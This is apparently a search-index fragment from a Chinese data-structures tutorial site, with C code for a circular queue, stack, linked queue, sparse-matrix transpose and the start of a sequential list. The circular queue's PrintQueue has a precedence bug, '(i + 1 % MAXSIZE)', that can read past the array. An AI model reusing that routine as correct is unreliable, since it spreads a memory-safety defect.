printf(\"\u961f\u5217\u5df2\u521d\u59cb\u5316\uff01\\n\");\n            break;\n        case 2:\n            printf(\"\u8bf7\u8f93\u5165\u8981\u5165\u961f\u7684\u5143\u7d20x=\");\n            scanf(\"%d\", &amp;x);\n            if(!enqueue(&amp;Q,x))\n            {\n                printf(\"\u5143\u7d20x=%d\u5df2\u5165\u961f\\n\", x);\n            }\n            break;\n        case 3:\n            printf(\"\u786e\u5b9a\u8981\u51fa\u961f\uff08\u51fa\u961f\u4f1a\u5c06\u5220\u9664\u5bf9\u9996\u5143\u7d20, y or n, n\uff09\uff1f\");\n            flushall();\n            scanf(\"%c\", &amp;yn);\n\n            if(yn == 'y' || yn == 'Y')\n            {\n                if(!dequeue(&amp;Q,&amp;x))\n                {\n                    printf(\"\u961f\u9996\u5143\u7d20\u3010%d\u3011\u5df2\u51fa\u961f\uff01\\n\", x);\n                }\n            }\n            break;\n        case 4:\n            if(isempty(&amp;Q))\n            {\n                printf(\"\u961f\u5217\u4e3a\u7a7a\uff01\\n\");\n            }\n            else{\n                printf(\"\u961f\u5217\u4e0d\u4e3a\u7a7a!\\n\");\n            }\n            break;\n        case 5:\n            if(isfull(&amp;Q))\n            {\n                printf(\"\u961f\u5217\u4e3a\u6ee1\uff01\\n\");\n            }\n            else{\n                printf(\"\u961f\u5217\u672a\u6ee1!\\n\");\n            }\n\n            break;\n        case 6:\n            if(!QueueFront(&amp;Q,&amp;x))\n            {\n                printf(\"\u961f\u9996\u5143\u7d20\u4e3a\u3010%d\u3011\uff01\\n\", x);\n            }\n            break;\n        case 7:\n            PrintQueue(&amp;Q);\n            printf(\"\\n\");\n            break;\n        case 8:\n            if(!getLength(&amp;Q,&amp;x))\n            {\n                printf(\"\u961f\u5217\u957f\u5ea6\u4e3a\u3010%d\u3011\uff01\\n\", x);\n            }\n            break;\n        case 9:\n            printf(\"\u672c\u7a0b\u5e8f\u7531zzb\u8bbe\u8ba1\u5f00\u53d1,\u5b9e\u73b0\u4e86\u5faa\u73af\u961f\u5217\u7684\u5165\u961f\u3001\u51fa\u961f\u3001\u53d6\u961f\u5934\u7b49\u64cd\u4f5c\\n\");\n\n        }\n\n    }while(cmd!=0);\n\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#2-circlesqueuec","title":"2\u3001\u00a0CirclesQueue.c","text":"C<pre><code>/*\n    CirclesQueue.c\n*/\n#include \"CirclesQueue.h\"\n\n/*\u5faa\u73af\u961f\u5217\u521d\u59cb\u5316*/\nint init(CirclesQueue *Q)\n{\n    Q-&gt;front = Q-&gt;rear = 0;\n    return 0;\n}\n\n\n/*\u5165\u961f*/\nint enqueue(CirclesQueue *Q, DataType x)\n{\n    if(isfull(Q))\n    {\n        printf(\"\u961f\u5217\u5df2\u6ee1\uff01100001\\n\");\n        return 100001;\n    }\n\n    Q-&gt;rear = (Q-&gt;rear+1) % MAXSIZE;\n    Q-&gt;data[Q-&gt;rear] = x;\n    return 0;\n}\n\n/*\u961f\u6ee1\uff1f*/\nint isfull(CirclesQueue *Q)\n{\n    return (Q-&gt;rear+1)%MAXSIZE == Q-&gt;front ? 1 : 0;\n}\n\n\n/*\u51fa\u961f*/\nint dequeue(CirclesQueue *Q, DataType *x)\n{\n    if(isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01100002\\n\");\n        return 100002;\n    }\n    Q-&gt;front = (Q-&gt;front+1) % MAXSIZE;\n    *x = Q-&gt;data[Q-&gt;front];\n    return 0;\n}\n\n/*\u961f\u7a7a*/\nint isempty(CirclesQueue *Q)\n{\n    return (Q-&gt;front == Q-&gt;rear) ? 1 : 0;\n}\n/*\u53d6\u961f\u5934\u5143\u7d20*/\nint QueueFront(CirclesQueue *Q,DataType *x)\n{\n    if(isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01100002\\n\");\n        return 100002;\n    }\n    *x = Q-&gt;data[(Q-&gt;front + 1) % MAXSIZE];\n    return 0;\n\n\n}\n/*\u8f93\u51fa\u961f\u5217*/\nvoid PrintQueue(CirclesQueue *Q){\n    int i;\n    if (isempty(Q))\n    {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff01\\n\");\n        return;\n    }\n    i=(Q-&gt;front)%MAXSIZE;\n    do\n    {\n        printf(\"%d\u3001\",Q-&gt;data[(i + 1 % MAXSIZE)]);\n        i=(i+1)%MAXSIZE;\n    }while(i!=Q-&gt;rear);\n}\n/*\u83b7\u53d6\u961f\u5217\u957f\u5ea6*/ \nint getLength(CirclesQueue *Q,DataType *x) {  \n  *x= (Q-&gt;rear - Q-&gt;front + MAXSIZE) % MAXSIZE; \n  return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#3-circlesqueueh","title":"3\u3001\u00a0CirclesQueue.h","text":"C<pre><code>/*\n    CirclesQueue.h\n    \u5faa\u73af\u961f\u5217\n*/\n\n#define MAXSIZE 4\n\ntypedef int DataType;\n\ntypedef struct\n{\n    DataType data[MAXSIZE];\n    int front;\n    int rear;\n}CirclesQueue;\n\n/*\u5faa\u73af\u961f\u5217\u521d\u59cb\u5316*/\nint init(CirclesQueue *Q);\n\n/*\u5165\u961f*/\nint enqueue(CirclesQueue *Q, DataType x);\n\n/*\u961f\u6ee1\uff1f*/\nint isfull(CirclesQueue *Q);\n\n/*\u51fa\u961f*/\nint dequeue(CirclesQueue *Q, DataType *x);\n\n/*\u961f\u7a7a*/\nint isempty(CirclesQueue *Q);\n/*\u53d6\u961f\u5934\u5143\u7d20*/\nint QueueFront(CirclesQueue *Q,DataType *x);\n/*\u8f93\u51fa\u961f\u5217*/\nvoid PrintQueue(CirclesQueue *Q);\n/*\u961f\u5217\u957f\u5ea6*/\nint getLength(CirclesQueue *Q,DataType *x);\n</code></pre>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_6","title":"\u4e94\u3001\u5c0f\u7ed3","text":"<p>1\u3001\u5faa\u73af\u961f\u5217\u662f\u4e00\u79cd\u7ebf\u6027\u6570\u636e\u7ed3\u6784\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3a \u201c\u73af\u5f62\u7f13\u51b2\u5668\u201d\u3002\u5b83\u53ea\u5141\u8bb8\u5728\u4e00\u7aef\u8fdb\u884c\u63d2\u5165\u64cd\u4f5c\uff0c\u5373\u961f\u5c3e\uff08rear\uff09\uff0c\u800c\u5728\u53e6\u4e00\u7aef\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\uff0c\u5373\u961f\u5934 (front)\uff0c\u5176\u64cd\u4f5c\u8868\u73b0\u57fa\u4e8e FIFO\uff08\u5148\u8fdb\u5148\u51fa\uff09\u539f\u5219\u5e76\u4e14\u961f\u5c3e\u88ab\u8fde\u63a5\u5728\u961f\u9996\u4e4b\u540e\u4ee5\u5f62\u6210\u4e00\u4e2a\u5faa\u73af\u3002</p> <p>2\u3001\u5faa\u73af\u961f\u5217\u7684\u5e94\u7528\u8303\u56f4\u975e\u5e38\u5e7f\u6cdb\uff0c\u6bd4\u5982\u7ebf\u7a0b\u6c60\u4efb\u52a1\u8c03\u5ea6\u3001\u6d88\u606f\u961f\u5217\u7cfb\u7edf\u3001\u7f13\u51b2\u533a\u7ba1\u7406\u3001\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u7b49\u5e94\u7528\u573a\u666f\u3002</p> <p>3\u3001\u961f\u5217\u6ee1\u65f6\uff0c\u65e0\u6cd5\u518d\u8fdb\u884c\u63d2\u5165\u64cd\u4f5c\uff1b\u5f53\u961f\u5217\u7a7a\u65f6\uff0c\u65e0\u6cd5\u518d\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\u3002\u961f\u5217\u7684\u5927\u5c0f\u662f\u56fa\u5b9a\u7684\uff0c\u4e00\u65e6\u521b\u5efa\u540e\u4e0d\u80fd\u6539\u53d8\u3002</p>"},{"location":"DEC/Data-Structure/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97/#_7","title":"\u516d\u3001\u53c2\u8003\u6587\u732e","text":"<p>\u300a\u6570\u636e\u7ed3\u6784\u300b(C \u8bed\u8a00\u7248\uff09\u674e\u521a\uff0c\u5218\u4e07\u8f89. \u5317\u4eac\uff1a\u9ad8\u7b49\u6559\u80b2\u51fa\u7248\u793e\u00a0\uff0c2017.\u00a0 \u00a0</p> <p>\u300aC \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u300b(\u7b2c\u56db\u7248\uff09\u8c2d\u6d69\u5f3a. \u5317\u4eac\uff1a\u6e05\u534e\u5927\u5b66\u51fa\u7248\u793e\uff0c2014.</p> <p>CSDN \u6570\u636e\u7ed3\u6784 ----- \u5faa\u73af\u961f\u5217</p>"},{"location":"DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/","title":"\u6808\u548c\u961f\u5217","text":""},{"location":"DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_2","title":"\u6808","text":"C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int STDataType;\n\ntypedef struct Stack\n{\n    STDataType* a;\n    int top; // \u6808\u9876\uff08\u76f8\u5f53\u4e8e\u662f\u4e0b\u6807\uff09\n    int capacity; // \u5bb9\u91cf\n}ST;\n\nvoid StackInit(ST* ps);\nvoid StackDestory(ST* ps);\n\n// \u5165\u6808\nvoid StackPush(ST* ps, STDataType x);\n\n// \u51fa\u6808\nvoid StackPop(ST* ps);\n\nSTDataType StackTop(ST* ps);\nint StackSize(ST* ps);\nbool StackEmpty(ST* ps);\n\n\n\nvoid StackInit(ST* ps)\n{\n    assert(ps);\n\n    ps-&gt;a = (STDataType*)malloc(sizeof(STDataType) * 4);\n    if (ps-&gt;a == NULL)\n    {\n        printf(\"malloc fail\\n\");\n        exit(-1);\n    }\n\n    ps-&gt;capacity = 4;\n    ps-&gt;top = 0;\n}\n\nvoid StackDestory(ST* ps)\n{\n    assert(ps);\n    free(ps-&gt;a);\n    ps-&gt;a = NULL;\n    ps-&gt;top = ps-&gt;capacity = 0;\n}\n\n// \u5165\u6808\nvoid StackPush(ST* ps, STDataType x)\n{\n    assert(ps);\n\n    // \u6ee1\u4e86-&gt;\u589e\u5bb9\n    if (ps-&gt;top == ps-&gt;capacity)\n    {\n        STDataType* tmp = (STDataType*)realloc(ps-&gt;a, ps-&gt;capacity * 2 * sizeof(STDataType));\n        if (tmp == NULL)\n        {\n            printf(\"realloc fail\\n\");\n            exit(-1);\n        }\n        else\n        {\n            ps-&gt;a = tmp;\n            ps-&gt;capacity *= 2;\n        }\n    }\n\n    ps-&gt;a[ps-&gt;top] = x;\n    ps-&gt;top++;\n}\n\n// \u51fa\u6808\nvoid StackPop(ST* ps)\n{\n    assert(ps);\n    // \u6808\u7a7a\u4e86\uff0c\u8c03\u7528Pop\uff0c\u76f4\u63a5\u4e2d\u6b62\u7a0b\u5e8f\u62a5\u9519\n    assert(ps-&gt;top &gt; 0);\n\n    //ps-&gt;a[ps-&gt;top - 1] = 0;\n    ps-&gt;top--;\n}\n\nSTDataType StackTop(ST* ps)\n{\n    assert(ps);\n    // \u6808\u7a7a\u4e86\uff0c\u8c03\u7528Top\uff0c\u76f4\u63a5\u4e2d\u6b62\u7a0b\u5e8f\u62a5\u9519\n    assert(ps-&gt;top &gt; 0);\n\n    return ps-&gt;a[ps-&gt;top - 1];\n}\n\nint StackSize(ST* ps)\n{\n    assert(ps);\n\n    return ps-&gt;top;\n}\n\nbool StackEmpty(ST* ps)\n{\n    assert(ps);\n\n    return ps-&gt;top == 0;\n}\n\n\nint main()\n{\n    ST st;\n    StackInit(&amp;st);\n    StackPush(&amp;st, 1);\n    StackPush(&amp;st, 2);\n    StackPush(&amp;st, 3);\n\n    printf(\"%d \", StackTop(&amp;st));\n    StackPop(&amp;st);\n    printf(\"%d \", StackTop(&amp;st));\n    StackPop(&amp;st);\n\n    StackPush(&amp;st, 4);\n    StackPush(&amp;st, 5);\n\n    while (!StackEmpty(&amp;st))\n    {\n        printf(\"%d \", StackTop(&amp;st));\n        StackPop(&amp;st);\n    }\n    printf(\"\\n\");\n\n    StackDestory(&amp;st);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_3","title":"\u961f\u5217","text":"C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int QDataType;\n\ntypedef struct QueueNode\n{\n    struct QueueNode* next;\n    QDataType data;\n}QNode;\n\ntypedef struct Queue\n{\n    QNode* head;\n    QNode* tail;\n}Queue;\n\n\nvoid QueueInit(Queue* pq);\nvoid QueueDestory(Queue* pq);\n\n// \u961f\u5c3e\u5165\nvoid QueuePush(Queue* pq, QDataType x);\n\n// \u961f\u5934\u51fa\nvoid QueuePop(Queue* pq);\n\nQDataType QueueFront(Queue* pq);\nQDataType QueueBack(Queue* pq);\n\nint QueueSize(Queue* pq);\nbool QueueEmpty(Queue* pq);\n\n\n\n// \u529f\u80fd\u5b9e\u73b0\n\nvoid QueueInit(Queue* pq)\n{\n    assert(pq);\n    pq-&gt;head = pq-&gt;tail = NULL;\n}\n\nvoid QueueDestory(Queue* pq)\n{\n    assert(pq);\n\n    QNode* cur = pq-&gt;head;\n    while (cur)\n    {\n        QNode* next = cur-&gt;next;\n        free(cur);\n        cur = next;\n    }\n\n    pq-&gt;head = pq-&gt;tail = NULL; // \u522b\u5fd8\u4e86\u8fd9\u4e2a\n}\n\n// \u961f\u5c3e\u5165\nvoid QueuePush(Queue* pq, QDataType x)\n{\n    assert(pq);\n    QNode* newnode = (QNode*)malloc(sizeof(QNode));\n    if (newnode == NULL)\n    {\n        printf(\"malloc fail\\n\");\n        exit(-1);\n    }\n\n    newnode-&gt;data = x;\n    newnode-&gt;next = NULL;\n\n    if (pq-&gt;tail == NULL)\n    {\n        pq-&gt;head = pq-&gt;tail = newnode;\n    }\n    else\n    {\n        pq-&gt;tail-&gt;next = newnode;\n        pq-&gt;tail = newnode;\n    }\n}\n\n// \u961f\u5934\u51fa\nvoid QueuePop(Queue* pq)\n{\n    assert(pq);\n    assert(pq-&gt;head);\n\n\n\n    if (pq-&gt;head-&gt;next == NULL) // \u961f\u5217\u4e2d\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\n    {\n        free(pq-&gt;head);\n        pq-&gt;head = pq-&gt;tail = NULL;\n    }\n    else\n    {\n        QNode* next = pq-&gt;head-&gt;next;\n        free(pq-&gt;head);\n        pq-&gt;head = next;\n    }\n}\n\n\nQDataType QueueFront(Queue* pq)\n{\n    assert(pq);\n    assert(pq-&gt;head);\n\n    return pq-&gt;head-&gt;data;\n}\n\nQDataType QueueBack(Queue* pq)\n{\n    assert(pq);\n    assert(pq-&gt;head);\n\n    return pq-&gt;tail-&gt;data;\n}\n\nint QueueSize(Queue* pq)\n{\n    assert(pq);\n    int size = 0;\n    QNode* cur = pq-&gt;head;\n    while (cur)\n    {\n        ++size;\n        cur = cur-&gt;next;\n    }\n\n    return size;\n}\n\nbool QueueEmpty(Queue* pq)\n{\n    assert(pq);\n    return pq-&gt;head == NULL;\n}\n\n\nint main()\n{\n    Queue q;\n    QueueInit(&amp;q);\n    QueuePush(&amp;q, 1);\n    QueuePush(&amp;q, 2);\n    printf(\"%d \", QueueFront(&amp;q));\n    QueuePop(&amp;q);\n    printf(\"%d \", QueueFront(&amp;q));\n    QueuePop(&amp;q);\n\n    QueuePush(&amp;q, 3);\n    QueuePush(&amp;q, 4);\n\n    while (!QueueEmpty(&amp;q))\n    {\n        printf(\"%d \", QueueFront(&amp;q));\n        QueuePop(&amp;q);\n    }\n    printf(\"\\n\");\n\n    QueueDestory(&amp;q);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BD%AC%E7%BD%AE%E8%BF%90%E7%AE%97/","title":"\u7a00\u758f\u77e9\u9635\u7684\u8f6c\u7f6e","text":"<p>\u4e0b\u9762\u7a0b\u5e8f\u5b9e\u73b0\u7a00\u758f\u77e9\u9635\u7684\u8f6c\u7f6e\u8fd0\u7b97\uff0c\u5047\u8bbe\u7a00\u758f\u77e9\u9635A\u91c7\u7528\u4e09\u5143\u7ec4\u8868\u793a\u3002 \u7f16\u5199\u4e00\u4e2a\u51fd\u6570\u8ba1\u7b97\u5176\u8f6c\u7f6e\u77e9\u9635B\uff0c\u8981\u6c42B\u4e5f\u7528\u4e09\u5143\u7ec4\u8868\u793a\u3002</p> <p>\uff08\u4e0d\u4f1a\u505a\u7684\u65f6\u5019\u5c31\u753b\u56fe\u770b\u770b\uff09</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAXSIZE 12500  //\u5047\u8bbe\u975e\u96f6\u5143\u4e2a\u6570\u7684\u6700\u5927\u503c\u4e3a12500\n\ntypedef int ElemType;\n\ntypedef struct {\n    int row, col;      /* \u5143\u7d20\u6240\u5728\u7684\u884c\u3001\u5217\u53f7 */\n    ElemType e;        /* \u975e\u96f6\u6570\u636e\u5143\u7d20 */\n} Triple;\n\ntypedef struct {\n    Triple data[MAXSIZE + 1];  /* \u4f7f\u7528\u6570\u7ec4\u5b58\u50a8\u6bcf\u4e00\u4e2a\u975e\u96f6\u5143\u7684\u4e09\u5143\u7ec4 */\n    int mu, nu, tu;            /* nu, mu \u4e3a\u77e9\u9635\u7684\u884c\u3001\u5217\u6570\uff0ctu \u4e3a\u975e\u96f6\u5143\u7684\u4e2a\u6570 */\n} TSMatrix;\n\nvoid TransposeMatrix(TSMatrix A, TSMatrix* B)\n/* A \u662f\u7a00\u758f\u77e9\u9635\u7684\u4e09\u5143\u7ec4\u5f62\u5f0f\uff0cB \u662f\u5b58\u653e A \u7684\u8f6c\u7f6e\u77e9\u9635\u7684\u4e09\u5143\u7ec4\u6570\u7ec4 */\n{\n    int i, j, k;\n    B-&gt;mu = A.nu; // \u5c06\u77e9\u9635 A \u7684\u884c\u6570\u8d4b\u503c\u7ed9\u77e9\u9635 B \u7684\u5217\u6570\n    B-&gt;nu = A.mu; // \u5c06\u77e9\u9635 A \u7684\u5217\u6570\u8d4b\u503c\u7ed9\u77e9\u9635 B \u7684\u884c\u6570\n    B-&gt;tu = A.tu; // \u5c06\u77e9\u9635 A \u7684\u975e\u96f6\u5143\u7d20\u4e2a\u6570\u8d4b\u503c\u7ed9\u77e9\u9635 B \u7684\u975e\u96f6\u5143\u7d20\u4e2a\u6570\n\n    if (B-&gt;tu &gt; 0) { // \u9996\u5148\u68c0\u67e5\u77e9\u9635 B \u7684\u975e\u96f6\u5143\u7d20\u4e2a\u6570\u662f\u5426\u5927\u4e8e\u96f6\n        j = 1; \n        // \u5728\u8f6c\u7f6e\u64cd\u4f5c\u4e2d\uff0c\u9996\u5148\u7528\u53d8\u91cf j \u521d\u59cb\u5316\u4e3a1\uff0c\u8868\u793a\u76ee\u524d\u5b58\u50a8\u5230\u77e9\u9635 B \u7684\u7b2c\u4e00\u4e2a\u975e\u96f6\u5143\u7d20\u3002\n        // \u7136\u540e\uff0c\u901a\u8fc7 for \u5faa\u73af\u904d\u5386\u77e9\u9635 B \u7684\u6bcf\u4e00\u5217\uff08k \u8868\u793a\u5f53\u524d\u5217\u7684\u7d22\u5f15\uff09\u3002\n\n        for (k = 1; k &lt;= A.nu; k++) {  // \u5bf9\u4e8e A \u4e2d\u7684\u6bcf\u4e00\u5217\n            for (i = 1; i &lt;= A.tu; i++) {  // \u5728 A \u4e2d\u627e\u5230\u5bf9\u5e94\u5217\u7684\u975e\u96f6\u5143\u7d20\n                // \u5728\u6bcf\u4e00\u5217\u7684\u5faa\u73af\u5185\u90e8\uff0c\u901a\u8fc7\u5d4c\u5957\u7684 for \u5faa\u73af\u904d\u5386\u77e9\u9635 A \u4e2d\u7684\u975e\u96f6\u5143\u7d20\u3002\n                // \u68c0\u67e5\u77e9\u9635 A \u4e2d\u5f53\u524d\u5143\u7d20\u7684\u5217\u53f7\u662f\u5426\u7b49\u4e8e\u5f53\u524d\u5217\u7d22\u5f15 k\u3002\n                if (A.data[i].col == k) {  // \u5982\u679c\u8be5\u975e\u96f6\u5143\u7d20\u7684\u5217\u53f7\u4e0e\u5f53\u524d\u5217\u76f8\u540c\uff0c\u8bf4\u660e\u8be5\u975e\u96f6\u5143\u7d20\u9700\u8981\u88ab\u8f6c\u7f6e\u5230\u77e9\u9635 B \u4e2d\u7684\u5f53\u524d\u5217\u3002\n                    // \u5c06\u8be5\u975e\u96f6\u5143\u7d20\u7684\u884c\u53f7\u8d4b\u503c\u7ed9\u77e9\u9635 B \u4e2d\u7684\u5f53\u524d\u5143\u7d20\u7684\u884c\u53f7\n                    // \u5c06\u8be5\u975e\u96f6\u5143\u7d20\u7684\u503c\u8d4b\u503c\u7ed9\u77e9\u9635 B \u4e2d\u7684\u5f53\u524d\u5143\u7d20\u7684\u503c\n                    B-&gt;data[j].row = A.data[i].col;\n                    B-&gt;data[j].col = A.data[i].row;\n                    B-&gt;data[j].e = A.data[i].e;\n                    j++;  // \u5c06\u975e\u96f6\u5143\u7d20\u5b58\u5165 B\uff0c\u5e76\u589e\u52a0 B \u4e2d\u975e\u96f6\u5143\u7d20\u7684\u8ba1\u6570\n                    // \u5e76\u5c06\u7d22\u5f15 j \u589e\u52a01\uff0c\u6307\u5411\u4e0b\u4e00\u4e2a\u8981\u5b58\u50a8\u7684\u975e\u96f6\u5143\u7d20\n                }\n            }\n        }\n    }\n}\n\n\nint main() {\n    TSMatrix A, B;\n\n    // \u521d\u59cb\u5316\u7a00\u758f\u77e9\u9635 A\n    A.mu = 3;  // \u884c\u6570\n    A.nu = 4;  // \u5217\u6570\n    A.tu = 4;  // \u975e\u96f6\u5143\u4e2a\u6570\n    A.data[1].row = 1; A.data[1].col = 1; A.data[1].e = 3;\n    A.data[2].row = 2; A.data[2].col = 2; A.data[2].e = 7;\n    A.data[3].row = 2; A.data[3].col = 4; A.data[3].e = 9;\n    A.data[4].row = 3; A.data[4].col = 4; A.data[4].e = 5;\n\n    // \u8f6c\u7f6e\u77e9\u9635 A\uff0c\u5e76\u5c06\u7ed3\u679c\u5b58\u50a8\u5728\u77e9\u9635 B \u4e2d\n    TransposeMatrix(A, &amp;B);\n\n    // \u8f93\u51fa\u8f6c\u7f6e\u540e\u7684\u77e9\u9635 B\n    printf(\"\u8f6c\u7f6e\u540e\u7684\u77e9\u9635 B\uff1a\\n\");\n    for (int i = 1; i &lt;= B.tu; i++) {\n        printf(\"(%d, %d, %d) \\n\", B.data[i].row, B.data[i].col, B.data[i].e);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/","title":"\u987a\u5e8f\u8868SeqList","text":""},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#_1","title":"\u7ebf\u6027\u8868","text":"<ul> <li> <p>\u7ebf\u6027\u8868\uff08linear list\uff09\u662f n \u4e2a\u5177\u6709\u76f8\u540c\u7279\u6027\u7684\u6570\u636e\u5143\u7d20\u7684\u6709\u9650\u5e8f\u5217\u3002 \u7ebf\u6027\u8868\u662f\u4e00\u79cd\u5728\u5b9e\u9645\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5e38\u89c1\u7684\u7ebf\u6027\u8868\uff1a\u987a\u5e8f\u8868\u3001\u94fe\u8868\u3001\u6808\u3001\u961f\u5217\u3001\u5b57\u7b26\u4e32\u2026</p> </li> <li> <p>\u7ebf\u6027\u8868\u5728\u903b\u8f91\u4e0a\u662f\u7ebf\u6027\u7ed3\u6784\uff0c\u4e5f\u5c31\u8bf4\u662f\u8fde\u7eed\u7684\u4e00\u6761\u76f4\u7ebf\u3002\u4f46\u662f\u5728\u7269\u7406\u7ed3\u6784\u4e0a\u5e76\u4e0d\u4e00\u5b9a\u662f\u8fde\u7eed\u7684\uff0c\u7ebf\u6027\u8868\u5728\u7269\u7406\u4e0a\u5b58\u50a8\u65f6\uff0c\u901a\u5e38\u4ee5\u6570\u7ec4\u548c\u94fe\u5f0f\u7ed3\u6784\u7684\u5f62\u5f0f\u5b58\u50a8\u3002</p> </li> </ul>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#_2","title":"\u987a\u5e8f\u8868","text":""},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#1","title":"1 \u4ec0\u4e48\u662f\u987a\u5e8f\u8868","text":"<ul> <li> <p>\u987a\u5e8f\u8868\u662f\u7528\u4e00\u6bb5\u7269\u7406\u5730\u5740\u8fde\u7eed\u7684\u5b58\u50a8\u5355\u5143\u4f9d\u6b21\u5b58\u50a8\u6570\u636e\u5143\u7d20\u7684\u7ebf\u6027\u7ed3\u6784\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u91c7\u7528\u6570\u7ec4\u5b58\u50a8\u3002\u5728\u6570\u7ec4 \u4e0a\u5b8c\u6210\u6570\u636e\u7684\u589e\u5220\u67e5\u6539\u3002</p> </li> <li> <p>\u987a\u5e8f\u8868\uff1a\u53ef\u52a8\u6001\u589e\u957f\u7684\u6570\u7ec4\uff0c\u8981\u6c42\u6570\u636e\u662f\u8fde\u7eed\u5b58\u50a8\u7684</p> </li> </ul>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#2","title":"2 \u987a\u5e8f\u8868\u7684\u5b9a\u4e49","text":"<p>1\u3001\u9759\u6001\u987a\u5e8f\u8868\uff1a\u4f7f\u7528\u5b9a\u957f\u6570\u7ec4\u5b58\u50a8\u5143\u7d20</p> <ul> <li>\u7f3a\u9677\uff1a\u7ed9\u5c0f\u4e86\u4e0d\u591f\u7528\uff0c\u7ed9\u5927\u4e86\u53ef\u80fd\u6d6a\u8d39\uff0c\u975e\u5e38\u4e0d\u5b9e\u7528</li> </ul> C<pre><code>#define N 10\ntypedef int SLDataType;\n\ntypedef struct SeqList\n{\n    SLDataType array[N];  //\u5b9a\u957f\u6570\u7ec4\n    size_t size;          //\u6709\u6548\u6570\u636e\u4e2a\u6570\n}SeqList;\n</code></pre> <p>2\u3001\u52a8\u6001\u987a\u5e8f\u8868\uff1a\u4f7f\u7528\u52a8\u6001\u5f00\u8f9f\u7684\u6570\u7ec4\u5b58\u50a8\u5143\u7d20</p> <ul> <li>\u52a8\u6001\u987a\u5e8f\u8868\u53ef\u6839\u636e\u6211\u4eec\u7684\u9700\u8981\u5206\u914d\u7a7a\u95f4\u5927\u5c0f</li> <li>size \u8868\u793a\u5f53\u524d\u987a\u5e8f\u8868\u4e2d\u5df2\u5b58\u653e\u7684\u6570\u636e\u4e2a\u6570</li> <li>capacity \u8868\u793a\u987a\u5e8f\u8868\u603b\u5171\u80fd\u591f\u5b58\u653e\u7684\u6570\u636e\u4e2a\u6570</li> </ul> C<pre><code>typedef int SLDataType; //\u7c7b\u578b\u91cd\u547d\u540d\uff0c\u540e\u7eed\u8981\u5b58\u50a8\u5176\u5b83\u7c7b\u578b\u65f6\u65b9\u4fbf\u66f4\u6539\n\ntypedef struct SeqList\n{\n    SLDataType* a;    //\u6307\u5411\u52a8\u6001\u5f00\u8f9f\u7684\u6570\u7ec4\n    size_t size;      //\u6709\u6548\u6570\u636e\u4e2a\u6570\n    size_t capacity;  //\u5bb9\u91cf\u5927\u5c0f\n}SeqList;\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#3","title":"3 \u987a\u5e8f\u8868\u7684\u63a5\u53e3\u5b9e\u73b0","text":"<p>\u9996\u5148\u65b0\u5efa\u4e00\u4e2a\u5de5\u7a0b\u6b64\u6b21\u7528\u7684\u662f\u52a8\u6001\u987a\u5e8f\u8868</p> <ul> <li>SeqList.h\uff08\u987a\u5e8f\u8868\u7684\u7c7b\u578b\u5b9a\u4e49\u3001\u63a5\u53e3\u51fd\u6570\u58f0\u660e\u3001\u5f15\u7528\u7684\u5934\u6587\u4ef6\uff09</li> <li>SeqList.c\uff08\u987a\u5e8f\u8868\u63a5\u53e3\u51fd\u6570\u7684\u5b9e\u73b0\uff09</li> <li>Test.c\uff08\u4e3b\u51fd\u6570\u3001\u6d4b\u8bd5\u987a\u5e8f\u8868\u5404\u4e2a\u63a5\u53e3\u529f\u80fd\uff09</li> </ul>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#_3","title":"\u5934\u6587\u4ef6","text":"<ul> <li>SeqList.h \u5934\u6587\u4ef6\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ul> C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n#pragma once  //\u9632\u6b62\u5934\u6587\u4ef6\u88ab\u4e8c\u6b21\u5f15\u7528\n\n#include &lt;stdio.h&gt;   /*perror, printf*/\n#include &lt;assert.h&gt;  /*assert*/\n#include &lt;stdlib.h&gt;  